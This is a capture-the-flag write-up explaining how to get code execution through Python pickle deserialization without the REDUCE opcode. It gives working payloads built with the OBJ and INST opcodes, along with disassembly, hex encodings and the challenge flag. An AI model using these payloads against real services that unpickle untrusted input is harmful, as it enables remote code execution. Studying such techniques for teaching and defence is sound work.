# Irreductible

### Category

Misc

### Description

A Python deserialization challenge ? Easy ! I'll just copy-paste a generic payload and ... oh, *oh no*.
Format : **Hero{flag}**<br>
Author : **yarienkiva**

### Files

- [chall.zip](chall.zip)

### Write up

This write-up is a TL;DR version of a [blogpost I published a while ago](https://heartathack.club/blog/pickle-RCE-without-reduce), feel free to check it out for a more thorough write-up.

Pretty much all the payloads online use the `REDUCE` instruction. An example :

```py
from pickletools import optimize, dis
import pickle
import os

class RCE:
    def __reduce__(self):
        return os.system, ('touch /tmp/pwned',)

dis(optimize(pickle.dumps(RCE())))
"""
    0: \x80 PROTO      4
    2: \x95 FRAME      37
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x8c SHORT_BINUNICODE 'system'
   26: \x93 STACK_GLOBAL                        # 1. push posix.system
   27: \x8c SHORT_BINUNICODE 'touch /tmp/pwned'
   45: \x85 TUPLE1                              # 2. push ('touch /tmp/pwned',)
   46: R    REDUCE                              # 3. args = stack.pop()
                                                #    func = stack[-1]
                                                #    call func(*args)
   47: .    STOP
highest protocol among opcodes = 4
"""
```

The challenge however requires a payload that *doesn't* contain a `REDUCE` so the only option is to search for other exploit primitives similar to `REDUCE` in the [pickle source code](https://github.com/python/cpython/blob/main/Lib/pickle.py). This search yields an interesting function: `_instantiate`.


```py
def _instantiate(self, klass, args):
    # [...] 
    value = klass(*args)
    # [...]
    self.append(value) # push value onto the stack
```

Two different instructions that use the `_instantiate` function are `OBJ` and `INST`. Both can be used to get code execution :

With `OBJ` :
```py
>>> payload_obj
b'(cos\nsystem\nS"cat flag.txt"\no.'

>>> pickletools.dis(payload_obj)
    0: (    MARK
    1: c        GLOBAL     'os system'
   12: S        STRING     'cat flag.txt'
   28: o        OBJ        (MARK at 0)
   29: .    STOP

# 🥒 : 28636f730a73797374656d0a532263617420666c61672e747874220a6f2e
# Hero{Ins3cur3_d3s3ri4liz4tion_tickl3s_my_pickl3}
```

With `INST` :
```py
>>> payload_inst
b'(S"cat flag.txt"\nios\nsystem\n.'

>>> pickletools.dis(payload_inst)
    0: (    MARK
    1: S        STRING     'cat flag.txt'
   17: i        INST       'os system' (MARK at 0)
   28: .    STOP

# 🥒 : 28532263617420666c61672e747874220a696f730a73797374656d0a2e
# Hero{Ins3cur3_d3s3ri4liz4tion_tickl3s_my_pickl3}
```

### Flag

```Hero{Ins3cur3_d3s3ri4liz4tion_tickl3s_my_pickl3}```
